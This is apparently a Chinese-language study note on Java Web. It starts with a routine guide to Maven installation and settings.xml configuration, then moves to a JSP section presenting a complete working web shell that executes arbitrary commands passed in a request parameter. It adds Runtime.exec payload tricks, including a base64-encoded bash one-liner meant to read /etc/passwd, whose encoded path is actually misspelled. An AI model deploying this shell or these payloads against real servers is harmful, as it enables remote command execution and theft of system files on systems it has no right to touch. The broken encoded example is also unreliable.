# Java Web

- [Java Web](#java-web)
  - [Maven](#maven)
    - [下载与配置](#下载与配置)
  - [JSP](#jsp)
    - [JSP 马](#jsp-马)


---

## Maven

> [Maven配置教程_霍英俊-CSDN博客_maven配置](https://blog.csdn.net/huo920/article/details/82082403)

### 下载与配置

在 [Maven – Download Apache Maven](https://maven.apache.org/download.cgi) 下载

<img src="http://cdn.ayusummer233.top/img/202201011531250.png" alt="image-20220101153104101" style="zoom: 80%;" />

解压到某个文件夹

![image-20220101153336808](http://cdn.ayusummer233.top/img/202201011533908.png)

配置 Maven 环境变量

![image-20220101153540046](http://cdn.ayusummer233.top/img/202201011535134.png)

编辑 PATH 变量

![image-20220101153734649](http://cdn.ayusummer233.top/img/202201011537762.png)

验证配置: `mvn -v`

<img src="http://cdn.ayusummer233.top/img/202201011543915.png" alt="image-20220101154317795" style="zoom:80%;" />

修改 Maven 配置 `C:\Programming\Java\apache-maven-3.8.4\conf\settings.xml`

修改本地仓库位置:

![image-20220101154858114](http://cdn.ayusummer233.top/img/202201011548230.png)

修改 maven 默认的 JDK 版本

![image-20220101155951312](http://cdn.ayusummer233.top/img/202201011559443.png)

```xml
    <profile>     
        <id>JDK-1.8</id>       
        <activation>       
            <activeByDefault>true</activeByDefault>       
            <jdk>1.8</jdk>       
        </activation>       
        <properties>       
            <maven.compiler.source>1.8</maven.compiler.source>       
            <maven.compiler.target>1.8</maven.compiler.target>       
            <maven.compiler.compilerVersion>1.8</maven.compiler.compilerVersion>       
        </properties>       
    </profile>
```

添加国内镜像源

```xml
<!-- 阿里云仓库 -->
<mirror>
    <id>alimaven</id>
    <mirrorOf>central</mirrorOf>
    <name>aliyun maven</name>
    <url>http://maven.aliyun.com/nexus/content/repositories/central/</url>
</mirror>

<!-- 中央仓库1 -->
<mirror>
    <id>repo1</id>
    <mirrorOf>central</mirrorOf>
    <name>Human Readable Name for this Mirror.</name>
    <url>http://repo1.maven.org/maven2/</url>
</mirror>

<!-- 中央仓库2 -->
<mirror>
    <id>repo2</id>
    <mirrorOf>central</mirrorOf>
    <name>Human Readable Name for this Mirror.</name>
    <url>http://repo2.maven.org/maven2/</url>
</mirror>

```

![image-20220101160226738](http://cdn.ayusummer233.top/img/202201011602870.png)


----

## JSP

JSP(Java Server Pages)是一种动态网页开发技术。它使用JSP标签在HTML网页中插入Java代码。

JSP是一种Java servlet，主要用于实现Java web应用程序的用户界面部分

---

### JSP 马


```jsp
<%@ page import="java.util.*,java.io.*"%>
<%%>
<HTML><BODY>
Commands with JSP
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
    if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p;
        if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
            p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
        }
        else{
                p = Runtime.getRuntime().exec(request.getParameter("cmd"));
            }
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
        }
    }
%>
</pre>
</BODY></HTML>
```

> [Runtime.getRuntime().exec踩坑总结](https://blog.51cto.com/stefanxfy/4722238)

> [java.lang.Runtime.exec() Payload Workarounds - @Jackson_T (bewhale.github.io)](https://bewhale.github.io/tools/encode.html)

偶尔有时命令执行有效负载`Runtime.getRuntime().exec()`失败. 使用 web shells, 反序列化漏洞或其他向量时可能会发生这种情况.

有时这是因为重定向和管道字符的使用方式在正在启动的进程的上下文中没有意义. 例如 `ls > dir_listing` 在shell中执行应该将当前目录的列表输出到名为的文件中 `dir_listing`. 但是在 `exec()` 函数的上下文中,该命令将被解释为获取 `>` 和 `dir_listing` 目录.

其他时候,其中包含空格的参数会被StringTokenizer类破坏.该类将空格分割为命令字符串. 那样的东西 `ls "My Directory"` 会被解释为 `ls '"My' 'Directory"'`.

在Base64编码的帮助下, 可以通过调用Bash或PowerShell再次使管道和重定向更好,并且还确保参数中没有空格.

比如将 bash 命令

```bash
cat /etc/passwd
```

转换为: 

```shell
bash -c {echo,Y2F0IC9lcnR0Yy9wYXNzd2Q=}|{base64,-d}|{bash,-i}
```

---




